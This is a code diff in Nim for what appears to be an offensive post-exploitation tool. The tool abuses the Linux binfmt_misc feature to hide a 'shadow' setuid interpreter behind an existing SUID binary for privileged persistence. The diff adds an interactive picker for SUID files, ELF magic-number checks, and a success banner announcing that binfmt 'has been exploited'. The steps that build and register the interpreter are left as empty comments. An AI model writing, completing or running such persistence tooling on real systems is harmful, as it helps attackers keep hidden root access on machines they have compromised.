@@ -3,7 +3,14 @@ import osproc
 import os
 import std/posix_utils
 import std/strutils
+import streams
 import terminal
+
+const ELF_HEADER = ['\x7F', 'E', 'L', 'F', '\x02', '\x01', '\x01', '\x00']
+const HEADER_SIZE = 8
+const MAGIC_SIZE = 126
+const SUID_PERM = 0o4000
+const EXEC_PERM = 0o100
 
 proc checkBinfmt(privesc:bool):bool=
   ## Different checks to verify that the binfmt config allow the exploit
@@ -52,7 +59,7 @@ proc isSETUID*(m: Mode,s=""): bool =
   ## Determine if a file has setuid bytes set
   ## (see https://github.com/c-blake/lc/blob/master/lc.nim#L568)
   let m = m.uint and 4095
-  result = (m and 0o4000) != 0 and (m and 0o100) != 0
+  result = (m and SUID_PERM) != 0 and (m and EXEC_PERM) != 0
 
 proc searchSuid(dir, file: string,chooseFile: bool): string=
   ## Find SUID fiels in a given directory. if file is filled nothing is done
@@ -71,15 +78,42 @@ proc searchSuid(dir, file: string,chooseFile: bool): string=
     #   #symlink
     #   echo "Link to file: ", path
     else: discard
-  echo(suids)
-  return "toto"
+  
+  if suids.len == 0: return ""
+  if chooseFile:
+    styledEcho(fgBlue, "Specify which suid file to use to hide the shadow suid:")
+    for idx, file in suids[0 .. ^1]:
+      echo "\t",idx,": ",file
+    while true:
+      stdout.styledWrite(fgBlue, "⌨️ Please type the number of the file (between 0 and ",$(suids.len-1),"): ")
+      let choice = readLine(stdin)
+      try:
+        if parseInt($choice) < suids.len: return suids[parseInt($choice)]
+      except ValueError:
+        styledEcho(fgRed, "Please enter a valid integer")
+  elif suids.len > 0 : return suids[^1]
+  return ""
 
 proc exploit(suid, payload: string): void=
-  #[
-  Obtain Magic number
-  Interpreter (nim/C)
-    -> Execute suid after
-  ]#
+  ## Exploit BIN_FMT feature to register a new type of executable
+  ## - Check that suid is an ELF binary
+  ## - create interpreter
+  ## - register the interpreter
+
+  # read header of suid file(for magic_number)
+  let stream = newFileStream(suid, mode = fmRead)
+  defer: stream.close()
+  # Check magic string
+  var magic_string: array[HEADER_SIZE, char]
+  discard stream.readData(magic_string.addr, HEADER_SIZE)    
+  if magic_string != ELF_HEADER:
+    styledEcho("❌ SUID file, ",suid,fgRed," is not an ELF binary")
+    quit(QuitSuccess)
+
+  # build intepreter
+  # register interpreter
+
+
   echo("\n🌒  binfmt has been exploited to maintain privileged persistence.")
   echo "\e[2mWelcome in the shadow\e[0m"
 
